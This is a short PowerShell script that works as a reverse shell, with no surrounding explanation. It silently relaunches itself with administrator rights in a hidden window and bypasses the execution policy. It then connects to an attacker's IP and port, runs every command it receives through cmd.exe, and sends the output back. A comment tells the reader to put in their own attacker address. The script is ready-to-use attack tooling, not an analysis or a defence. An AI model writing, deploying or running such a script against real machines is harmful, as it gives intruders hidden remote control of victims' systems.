# Check if the script is running as Administrator
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Relaunch the script as Administrator in a hidden window
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    Start-Process powershell -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden
    exit
}

# Replace 10.0.0.35 with your attacker's IP and 4444 with the listener port
$client = New-Object System.Net.Sockets.TCPClient("10.0.0.35", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

# Send commands and execute them
$writer.WriteLine("Connected to reverse shell!")
$writer.Flush()

while ($true) {
    $command = $reader.ReadLine()
    if ($command -eq "exit") { break }
    $output = cmd.exe /c $command 2>&1 | Out-String
    $writer.WriteLine($output)
    $writer.Flush()
}

$client.Close()
